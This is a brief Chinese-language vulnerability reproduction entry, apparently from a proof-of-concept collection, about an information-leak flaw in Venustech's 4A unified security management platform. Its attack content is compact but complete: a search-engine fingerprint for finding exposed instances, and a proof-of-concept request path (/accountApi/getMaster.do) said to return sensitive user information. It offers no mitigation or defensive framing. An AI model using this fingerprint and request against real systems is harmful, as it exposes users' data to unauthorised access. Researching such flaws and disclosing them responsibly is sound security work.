# 启明星辰 4A统一安全管控平台 getMaster.do 信息泄漏漏洞

## 漏洞描述

启明星辰 4A统一安全管控平台 getMaster.do 接口存在信息泄漏漏洞，通过发送特定请求包可以获取用户敏感信息

## 漏洞影响

<a-checkbox checked>启明星辰 4A统一安全管控平台</a-checkbox></br>

## 网络测绘

<a-checkbox checked>web.body="cas/css/ace-part2.min.css"</a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1691987645140-60c2204f-fdd2-4ca4-b8ab-0b890ae4a9cc.png)

验证POC

```http
/accountApi/getMaster.do
```

![image-20230814124146987](../../../.vuepress/public/img/image-20230814124146987.png)